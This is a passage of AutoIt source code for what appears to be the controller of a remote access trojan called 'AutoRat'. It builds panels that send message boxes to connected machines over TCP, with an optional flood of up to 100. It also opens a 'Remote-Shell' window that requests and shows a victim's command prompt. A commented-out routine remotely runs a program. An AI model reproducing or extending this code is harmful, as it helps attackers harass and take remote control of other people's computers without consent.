$Label2 = GUICtrlCreateLabel("Message Text: ", 208, 88, 77, 17)
GUICtrlSetFont(-1, 8, 400, 4, "MS Sans Serif")
$msgtext = GUICtrlCreateEdit("", 208, 112, 241, 153)
GUICtrlSetData(-1, "AutoRat ROCKS")
GUICtrlSetCursor (-1, 0)
$Cmsgflood = GUICtrlCreateCheckbox("Flood Messageboxes", 208, 282, 121, 17)
GUICtrlSetCursor (-1, 0)
$msgcombo = GUICtrlCreateCombo("5", 336, 280, 113, 25)
GUICtrlSetData ($msgcombo, "10|15|20|25|30|35|40|45|50|55|60|65|70|75|80|85|90|95|100")
GUICtrlSetCursor (-1, 0)
$msgtest[$pp] = GUICtrlCreateButton("Test Message", 208, 328, 99, 41, $WS_GROUP)
GUICtrlSetCursor (-1, 0)
$msgsend[$tt] = GUICtrlCreateButton("Send Message", 352, 328, 99, 41, $WS_GROUP)
GUICtrlSetCursor (-1, 0)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUISetState(@SW_SHOW)
_GUICtrlStatusBar_SetText ($msgstatusbar, "Msgbox Manager loaded.")
EndFunc

;~ Func _makeremoteshellgui ()
;~ $posremsock = StringInStr (WinGetTitle($nMsg[1]), "SOCKET:")
;~ $socket = StringTrimLeft (WinGetTitle($nMsg[1]),$posremsock+6)
;~ $remotebefehl="calc.exe"
;~ $string = ("REMOTE="&$remotebefehl)
;~ TCPSend ($socket, $string)
;~ EndFunc

Func _testmsg ()
$icon = 0
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:2]")) = 1 then $icon = 16
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:3]")) = 1 then $icon = 32
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:4]")) = 1 then $icon = 48
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:5]")) = 1 then $icon = 64
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:6]")) = 1 then $icon = 0
$msgboxtitle = ControlGetText (WinGetTitle($nMsg[1]), "", "[CLASS:Edit; INSTANCE:1]")
$msgboxtext = ControlGetText (WinGetTitle($nMsg[1]), "", "[CLASS:Edit; INSTANCE:2]")
MsgBox ($icon, $msgboxtitle, $msgboxtext)




EndFunc



Func _msgsend ()
$pos55 = StringInStr (WinGetTitle($nMsg[1]), "SOCKET:")
$socket = StringTrimLeft (WinGetTitle($nMsg[1]),$pos55+6)
$icon = 0
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:2]")) = 1 then $icon = 16
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:3]")) = 1 then $icon = 32
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:4]")) = 1 then $icon = 48
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:5]")) = 1 then $icon = 64
if _GUICtrlButton_GetCheck(ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:6]")) = 1 then $icon = 0


$msgboxtitle = ControlGetText (WinGetTitle($nMsg[1]), "", "[CLASS:Edit; INSTANCE:1]")
$msgboxtext = ControlGetText (WinGetTitle($nMsg[1]), "", "[CLASS:Edit; INSTANCE:2]")

Local $anzahl=1
Local $flood=0
if _GUICtrlButton_GetState (ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:Button; INSTANCE:9]")) = 1 Then $flood = 1
	if $flood = 1 Then
		$anzahl = ControlGetText(WinGetTitle($nMsg[1]), "", "[CLASS:Edit; INSTANCE:3]")
		$anzahl = Int($anzahl)
		if $anzahl = 0 Then $anzahl = 1
		else
		$flood = 0
EndIf



;~ $string = "\\MSGBOXTITLE="&$msgboxtitle&"\\MSGBOXTEXT="&$msgboxtext&"\\ICON="&$icon&"\\FLOOD="&$flood&"\\ANZAHL="&$anzahl

$string = "MSGBOX="&@CRLF&$msgboxtitle&@CRLF&$msgboxtext&@CRLF&$icon&@CRLF&$flood&@CRLF&$anzahl
;~ ClipPut ($string2)


TCPSend ($socket, $string)
_GUICtrlStatusBar_SetText (ControlGetHandle (WinGetTitle($nMsg[1]), "", "[CLASS:msctls_statusbar32; INSTANCE:1]"), "Message sent.")

EndFunc

Func _makeremoteshellgui ()
	$dummy = _GUICtrlListView_GetSelectedIndices ($ListView1, true)
	if WinExists ("Remote-Shell "&_GUICtrlListView_GetItemText($ListView1,$dummy[1])&"  SOCKET:"&_guictrllistview_getitemtext($ListView1,$dummy[1],4)) = 1 Then
	Return 0
EndIf

GUICreate("Remote-Shell "&_GUICtrlListView_GetItemText($ListView1,$dummy[1])&"  SOCKET:"&_guictrllistview_getitemtext($ListView1,$dummy[1],4),600,300)

$cmdedit = GUICtrlCreateEdit("Please wait..."&@CRLF&@CRLF&"--> CMD is loading...",-1,-1,602,280,$ES_READONLY + $WS_VSCROLL)
GUICtrlSetBkColor (-1, 0x000000)
GUICtrlSetColor (-1, 0x00ff00)
$cmdinput[$cmdvar] = GUICtrlCreateInput("",-1,278,-1,-1, BitOR($ES_AUTOHSCROLL,$ES_WANTRETURN))

GUICtrlSetBkColor (-1, 0x000000)
GUICtrlSetColor (-1, 0x00ff00)
GUICtrlSetFont(-1,11.5,600)
ControlFocus("","",-1)
GUISetState(@SW_SHOW)
$socket = _guictrllistview_getitemtext($ListView1,$dummy[1],4)
TCPSend ($socket, "GETCMD")

while 1
	$getcmd = TCPRecv ($socket, 1024)
	if StringLeft ($getcmd, 4) <> "CMD=" then
		ContinueLoop
	Elseif $getcmd = "CMDFAIL" Then
			GUIDelete ("Remote-Shell "&_GUICtrlListView_GetItemText($ListView1,$dummy[1])&"  SOCKET:"&_guictrllistview_getitemtext($ListView1,$dummy[1],4))
			Return 0
	Else
		ExitLoop
	EndIf
WEnd
$getcmd = StringTrimLeft ($getcmd, 4)
GUICtrlSetData ($cmdedit, $getcmd)
_GUICtrlEdit_Scroll($cmdedit, $SB_SCROLLCARET)
EndFunc

Func _remoteshell()

EndFunc
